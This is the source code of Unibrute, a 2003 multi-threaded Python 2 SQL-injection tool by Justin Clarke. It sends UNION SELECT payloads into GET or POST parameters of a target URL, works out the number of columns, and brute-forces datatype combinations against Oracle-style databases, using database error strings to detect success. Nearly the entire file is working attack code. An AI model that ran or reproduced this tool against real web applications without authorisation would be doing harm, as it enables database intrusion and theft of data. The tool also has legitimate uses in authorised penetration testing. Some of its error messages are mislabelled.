#!/bin/sh
''':'
exec python -u "$0" ${1+"$@"}
' '''

# Unibrute - multi threaded union bruteforcer
# By Justin Clarke, justin at justinclarke.com
# Version .01b2, December 11, 2003
#
# This tool is released under the Reciprocal Public License
# This open source license is available for review at
# http://www.opensource.org/licenses/rpl.php
#

import threading, Queue, sys, getopt, string, urllib, urllib2, time, re

#
# class to manage the threading.  No actual stuff is done in here - we pass function names and args
# taken from Python in a Nutshell.... great book
#
class Worker(threading.Thread): # inherits the Thread class
    requestID = 0   # each thread has a request ID so we can match responses

    # constructor - takes two queues as parameters (overrides threading constructor)
    def __init__(self, requestsQueue, resultsQueue, **kwds):
        threading.Thread.__init__(self, **kwds)
        self.setDaemon(1)   # run in background
        self.workRequestQueue = requestsQueue
        self.resultQueue = resultsQueue
        self.start()        # start the thread

    # call the function here - pass in the function and parameters
    def performWork(self, callable, *args, **kwds):
        Worker.requestID += 1
        self.workRequestQueue.put((Worker.requestID, callable, args, kwds))
        return Worker.requestID
        
    def run(self):   # override run
        while 1:
            requestID, callable, args, kwds = self.workRequestQueue.get()
            self.resultQueue.put((requestID, callable(*args, **kwds)))

#
# main
#

def usage():
    print """
             ._____.                 __          
 __ __  ____ |__\_ |_________ __ ___/  |_  ____  
|  |  \/    \|  || __ \_  __ \  |  \   __\/ __ \ 
|  |  /   |  \  || \_\ \  | \/  |  /|  | \  ___/ 
|____/|___|  /__||___  /__|  |____/ |__|  \___  >
           \/        \/                       \/ 

Usage: %s [options] url

        [-h]            - this help
        [-v]            - verbose mode
        [-t number]     - number of worker threads (default 20)
        [-c string]     - cookies needed
        [-m GET|POST]   - force exploit on the querystring/post data
        [-d string]     - POST data 
        [-n number]     - number of columns in UNION
        [-g string]     - generic error string - specify columns if using this""" % sys.argv[0]

    print '\ne.g. %s -d "type=searchstate&state=az" http://foo.bar/locator.asp' % sys.argv[0]
    sys.exit(1)

# User variables - change if you want
num = 20    # default number of worker threads
targeturl = ""
cookie = ""
verb = ""
verbose = False
postdata = ""
colnum = 0
types = {"char":"to_char(1)", "number":"to_number(1)","date":"to_date(1)"}
errors = "(OLE DB|SQL Server|Incorrect Syntax|ODBC Driver|ORA\-|SQL command not|Oracle Error Code|CFQUERY|Operand clash|MySQL|CLI Driver|JET Database Engine error)"
colnoerr = "incorrect number of result columns"
exploit = "' union all select "
trailer = " from ALL_TABLES--"
generic = ""
regex = ""
coltest = "null"    # what we're testing for columns with
collim = 100

printf = sys.stdout.write   # so we can avoid those irritating space after a print

errormatch = '|'.join(map(re.escape,errors))

try:
    opts, args = getopt.gnu_getopt(sys.argv[1:], "g:hc:m:t:vd:n:")
    if len(args) <> 1:  # 1 arg is the URL
        raise getopt.error
except:
    usage()

targeturl = args

for o,a in opts:
    if o == "-v":
        verbose = True
    if o == "-c":
        cookie = a
    if o == "-h":
        usage()
    if o == "-d":
        postdata = a
        verb = "POST"
    if o == "-n":
        colnum = int(a)
        if colnum < 1:
            print "Must have at least 1 worker thread"
            sys.exit(1)
    if o == "-m":
        if string.upper(a) == "POST":
            verb = "POST"
        else:
            if string.upper(a) == "GET":
                verb = "GET"
            else:
                print "Method must be GET or POST"
                sys.exit(1)
    if o == "-t":
        num = int(a)
        if num < 1:
            print "Columns must be at least 1"
            sys.exit(1)
    if o == "-g":
        generic = a

if not verb:
    verb = "GET"

if (verb == "POST" and not postdata):
    print "Specify some POST data"
    sys.exit(1)
        
if (generic and not colnum): # can't do autodiscovery with generic errors
    print "Specify number of columns"
    sys.exit(1)

if generic:
    regex = generic
else:
    regex = errors

requestsQueue = Queue.Queue()
resultsQueue = Queue.Queue()
columnsQueue = Queue.Queue()

for i in range(num):
    worker = Worker(requestsQueue, resultsQueue)

def doRequest(expressionString, exploitdata):
    while True:
        if verb == "GET":   
            req = urllib2.Request(expressionString)
        else:
            req = urllib2.Request(expressionString, exploitdata)    
        if cookie<>"":
            req.add_header("Cookies",cookie)
        try:
            resp = urllib2.urlopen(req)
        except urllib2.HTTPError,err:  # catch an HTTP 500 error or similar here
            return err.read()
        except:     # can't reach the app or something
            print "Unexpected error on: %s %s - Retrying in 5 seconds" % (expressionString,exploitdata)
            time.sleep(5)
        else:
            return resp.read()

def showResults():
    while True:
        try: id, results = resultsQueue.get_nowait()
        except Queue.Empty: return

        if verbose:
            print 'Result %d: %s -> %s' % (id, workRequests[id], results)

        if re.search(regex,results):
            del workRequests[id]
            printf(".")
        else: # no error!
            if not results: return  # no response
            
            print "\nMatch found! Request no %d -> %s" % (id,workRequests[id])
            del workRequests[id]
            print "Time elapsed: %d seconds" % (time.time() - starttime)
            sys.exit(0)

workRequests = {}

def gencases(depth, seq):
    if depth >= colnum:     # we've recursed to colnum columns
        combo = ','.join(seq)
        columnsQueue.put(combo)
    else:               # if not recurse off for each data type value
        for i in types.values():
            gencases(depth+1,seq+[i])

def genreqs(cols):
    if verb == "GET":  # standard GET request- exploit querystring
        expressionString = targeturl[0] + urllib.quote(exploit + cols + trailer)
        exploitdata=""
    elif (verb == "GET" and postdata): # post request, but exploit querystring
        expressionString = targeturl[0] + urllib.quote(exploit + cols + trailer)
        exploitdata = postdata 
    else:  
        expressionString = targeturl[0] # standard post request, exploit post data
        exploitdata = postdata + urllib.quote(exploit + cols + trailer)
        
    id = worker.performWork(doRequest, expressionString, exploitdata)
    if verb == "GET":
        workRequests[id] = expressionString
    else:
        workRequests[id] = exploitdata
    
def getcols(depth):
    if depth >= collim:     # we've hit the column limit?
        print "Error determining number of columns"
        sys.exit(1)
    else:               # if not check and recurse for the next one
        test = ""
        for i in range(depth):
            if i < depth-1:
                test += coltest
                test += ","
            else:
                test += coltest

        genreqs(test)
    
        id, results = resultsQueue.get()
        
        if verbose:
            print 'Result: %s' % results

        del workRequests[id]
        
        if re.search(colnoerr,results):
            printf(".")
        else: # no column error!
            if not results: return  # no response
            print "\nFound columns: %d" % depth
            return depth
        
        ret = getcols(depth+1)
        return ret
        

if not colnum:
    colnum = getcols(1)    # discover columns

print "Generating test cases"
gencases(0,[])
print "Starting testing"

starttime = time.time()

for i in range(columnsQueue.qsize()):
    genreqs(columnsQueue.get_nowait())
    if not resultsQueue.empty(): 
        showResults()

while True: 
    if not resultsQueue.empty(): 
        showResults()
    if not workRequests: 
        print "Hmm, didn't find a match?  Try -v to see whats going on"
        sys.exit(1)
